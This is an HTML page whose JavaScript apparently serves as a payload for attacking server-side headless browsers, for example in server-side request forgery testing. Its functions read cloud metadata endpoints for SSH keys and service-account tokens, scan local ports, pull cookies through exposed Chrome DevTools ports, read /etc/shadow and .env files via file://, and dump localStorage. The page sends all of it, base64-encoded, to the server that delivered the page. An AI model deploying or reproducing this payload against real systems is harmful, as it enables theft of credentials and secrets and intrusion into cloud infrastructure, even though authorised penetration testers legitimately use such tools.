<html>
<head></head>
<body>
<!-- No-JS tracking: fires even if JavaScript is disabled -->
<img src="/ping?type=img" style="display:none" />
<noscript>
    <img src="/ping?type=noscript" />
</noscript>
<script>
//Collaborator server - uses the server that served this payload
var collaboratorUrl = window.location.protocol + "//" + window.location.host;

//Google Cloud
var googleMetadataServer = "metadata.google.internal";
var googleMetadataPaths = {"SSH-Keys: ": "/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json", "Service Accounts: ": "/computeMetadata/v1/instance/service-accounts/?recursive=true&alt=json", "Hostname: ": "/computeMetadata/v1/instance/hostname"}
var googleHeaders = {"X-Google-Metadata-Request": "true"}

//Alibaba Cloud
var alibabaMetadataServer = "100.100.100.200";
var alibabaMetadataPaths = {"SSH-Keys: ":"/latest/meta-data/public-keys/0/openssh-key", "Hostname: ": "/latest/meta-data/hostname", "User-Data: ": "/latest/user-data"};

//Amazon AWS & D.O
var othersMetadataServers = "169.254.169.254";

//Amazon
var amazonMetadataPaths = {"SSH-Keys: ": "/latest/meta-data/public-keys/0/openssh-key", "Hostname: ": "/latest/meta-data/public-hostname", "AMI-ID: ": "/latest/meta-data/ami-id"};

//Digital Ocean
var digitalOceanPaths = {"User-data": "/metadata/v1/user-data", "Hostname: ": "/metadata/v1/hostname", "SSH-Keys: ": "/metadata/v1/public-keys"}

//Common ports
var commonPorts = [80, 81, 300, 443, 591, 593, 832, 981, 1010, 1311, 2082, 2087, 2095, 2096, 2480, 3000, 3128, 3333, 4243, 4567, 4711, 4712, 4993, 5000, 5104, 5108, 5800, 6543, 7000, 7396, 7474, 8000, 8001, 8008, 8014, 8042, 8069, 8080, 8081, 8088, 8090, 8091, 8118, 8123, 8172, 8222, 8243, 8280, 8281, 8333, 8443, 8500, 8834, 8880, 8888, 8983, 9000, 9043, 9060, 9080, 9090, 9091, 9200, 9443, 9800, 9981, 12443, 16080, 18091, 18092, 20720, 28017];

//Chrome DevTools Protocol debug ports
var cdpPorts = [9222, 9229, 9481, 5858, 3389];

//Sensitive files to read via file:// protocol
var sensitiveFiles = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/app/.env",
    "/.env",
    "/var/log/auth.log"
];

function cloudMetadata(metadataServer, metadataPaths, headers){
    for (const [key, value] of Object.entries(metadataPaths)) {
        (function(k) {
            makeRequest("http://" + metadataServer + value, "GET", headers, function(response) {
                log(k + response);
            });
        })(key);
    }
}

function checkPort(scheme, ip, port){
    var img = new Image();
    var baseUrl = scheme + ip + ":" + port.toString();

    img.onload = function () {
        log("Open port: " + baseUrl);
    };

    img.src = baseUrl + "/favicon.ico";
}

function portScanner(ip, ports){
    var schemes = ["http://", "https://"];

    for (var i = 0; i < ports.length; i++){
        var port = ports[i];
        schemes.forEach(function(scheme) {
            checkPort(scheme, ip, port);
        });
    }
}

function getBrowserInfo(){
	var allInfo = "";
	allInfo += navigator.appName + " |=| ";
	allInfo += navigator.appVersion + " |=| ";
	allInfo += navigator.platform + " |=| ";
	allInfo += navigator.userAgent + " |=| ";
		   
	var plugins = navigator.plugins;
	allInfo += navigator.mimeTypes + " |=| ";
		   
	for (var i = 0; i < plugins.length; i++) {
	   var plugin = plugins[i];
	   allInfo += plugin.name + " |=| ";
	   allInfo += plugin.filename + ' - ' + plugin.description + " |=| ";

           for (var j = 0; j < plugin.length; j++) {
	      var mimetype = plugin[j];
	      allInfo += mimetype.type + " |=| ";
	   
              if(mimetype.description) {
		 allInfo += mimetype.description + " |=| ";
	      }
	      if(mimetype.suffixes) {
		 allInfo += ' - extentions: '+mimetype.suffixes + " |=| ";
	      }
	   }
			
	}

    log("Browser Info: " + allInfo);
}

function chromeHeadless(){
    cdpPorts.forEach(function(port) {
        var baseUrl = "http://127.0.0.1:" + port;

        // Check /json/version for browser info and WebSocket URL
        makeRequest(baseUrl + "/json/version", "GET", {}, function(response) {
            if (response && response.indexOf("webSocketDebuggerUrl") !== -1) {
                log("CDP port " + port + " /json/version: " + response);
                try {
                    var info = JSON.parse(response);
                    if (info.webSocketDebuggerUrl) {
                        log("CDP WebSocket URL found: " + info.webSocketDebuggerUrl);
                    }
                    if (info.Browser) {
                        log("CDP Browser: " + info.Browser);
                    }
                } catch(e) {}
            }
        });

        // Check /json or /json/list for open tabs (may contain session tokens in URLs)
        makeRequest(baseUrl + "/json", "GET", {}, function(response) {
            if (response && response.indexOf("devtoolsFrontendUrl") !== -1) {
                log("CDP port " + port + " /json (open tabs): " + response);
            }
        });

        // Try /json/new to check if we can open new tabs (PUT required but GET may leak info)
        makeRequest(baseUrl + "/json/new", "GET", {}, function(response) {
            if (response && response !== "Request failed, status-code: 404") {
                log("CDP port " + port + " /json/new: " + response);
            }
        });

        // Check /json/protocol for full protocol documentation
        makeRequest(baseUrl + "/json/protocol", "GET", {}, function(response) {
            if (response && response.indexOf("domains") !== -1) {
                log("CDP port " + port + " /json/protocol available (full CDP access)");
            }
        });
    });
}

// Exploit CDP WebSocket to extract cookies and storage
function cdpExtractData(wsUrl) {
    try {
        var ws = new WebSocket(wsUrl);

        ws.onopen = function() {
            log("CDP WebSocket connected: " + wsUrl);

            // Get all cookies
            ws.send(JSON.stringify({
                id: 1,
                method: "Network.getAllCookies"
            }));

            // Get browser command line (may reveal --no-sandbox)
            ws.send(JSON.stringify({
                id: 2,
                method: "Browser.getBrowserCommandLine"
            }));

            // Get browser version info
            ws.send(JSON.stringify({
                id: 3,
                method: "Browser.getVersion"
            }));
        };

        ws.onmessage = function(event) {
            var data = JSON.parse(event.data);
            if (data.id === 1 && data.result && data.result.cookies) {
                log("CDP Cookies: " + JSON.stringify(data.result.cookies));
            }
            if (data.id === 2 && data.result && data.result.arguments) {
                var args = data.result.arguments.join(" ");
                log("CDP Browser CommandLine: " + args);
                if (args.indexOf("--no-sandbox") !== -1) {
                    log("CDP WARNING: Browser running with --no-sandbox (sandbox disabled)");
                }
            }
            if (data.id === 3 && data.result) {
                log("CDP Browser Version: " + JSON.stringify(data.result));
            }
        };

        ws.onerror = function() {
            log("CDP WebSocket error: " + wsUrl);
        };
    } catch(e) {
        log("CDP WebSocket exception: " + e.toString());
    }
}

// Read local files via file:// protocol (works in server-side headless browsers)
function fileProtocolRead(files) {
    files.forEach(function(filePath) {
        // Method 1: iframe injection
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = 'file://' + filePath;
        iframe.onload = function() {
            try {
                var content = iframe.contentDocument.body.innerText || iframe.contentDocument.body.innerHTML;
                if (content && content.length > 0) {
                    log("File read via iframe (" + filePath + "): " + content);
                }
            } catch(e) {
                // Cross-origin restriction - expected in normal browsers
            }
            document.body.removeChild(iframe);
        };
        document.body.appendChild(iframe);

        // Method 2: XHR to file:// (works in some headless configurations)
        makeRequest('file://' + filePath, 'GET', {}, function(response) {
            if (response && response.indexOf("Request failed") === -1) {
                log("File read via XHR (" + filePath + "): " + response);
            }
        });

        // Method 3: fetch API (modern browsers)
        if (typeof fetch !== 'undefined') {
            fetch('file://' + filePath)
                .then(function(response) { return response.text(); })
                .then(function(content) {
                    if (content && content.length > 0) {
                        log("File read via fetch (" + filePath + "): " + content);
                    }
                })
                .catch(function(e) {});
        }
    });
}

// Read directory listing via file:// protocol
function fileProtocolListDir(dirPath) {
    var iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = 'file://' + dirPath;
    iframe.onload = function() {
        try {
            var content = iframe.contentDocument.body.innerHTML;
            if (content && content.indexOf('Index of') !== -1) {
                log("Directory listing (" + dirPath + "): " + content);
            }
        } catch(e) {}
        document.body.removeChild(iframe);
    };
    document.body.appendChild(iframe);
}

function localStorageLeak(){
	if (window.localStorage) {
	    if (localStorage.length) {
		    var output = "";
		    for (var i = 0; i < localStorage.length; i++) {
		            if (i > 0) { output += "&"; }
		            output += encodeURIComponent(localStorage.key(i)) + '=' + encodeURIComponent(localStorage.getItem(localStorage.key(i)));
		    }
		    log("LocalStorageLeak: " + output);
		}
	}
}

function log(data) {
    makeRequest(collaboratorUrl + "/log?msg=" + btoa(data), "GET", {});
}

function makeRequest(url, method, headers, callback) {
    try {
        var req = new XMLHttpRequest();
        req.open(method, url, true);

        for (const [key, value] of Object.entries(headers)) {
            req.setRequestHeader(key, value);
        }

        req.onreadystatechange = function() {
            if (req.readyState === 4) {
                if (callback) {
                    if (req.status === 200) {
                        callback(req.responseText);
                    } else {
                        callback("Request failed, status-code: " + req.status.toString());
                    }
                }
            }
        };

        req.send(null);
    } catch(err) {
        if (callback) {
            callback(null);
        }
    }
}

//Log Javascript enabled and triggered
log('Triggered in ' + window.location.href);

//Browser Storage Leak
//localStorageLeak();

//Try to fetch Chrome Headless debug port
//chromeHeadless();

//Get browser information (Plugins, versions, etc ...)
//getBrowserInfo();

//GET Cloud metadata information
//cloudMetadata(googleMetadataServer, googleMetadataPaths, googleHeaders);

//Local port scanner
//portScanner("127.0.0.1", commonPorts);

//File protocol attacks (server-side headless browsers)
//fileProtocolRead(sensitiveFiles);
//fileProtocolListDir("/app");
//fileProtocolListDir("/");

//CDP WebSocket exploitation (call with wsUrl from chromeHeadless results)
//cdpExtractData("ws://127.0.0.1:9222/devtools/browser/...");

</script>
</body>
</html>
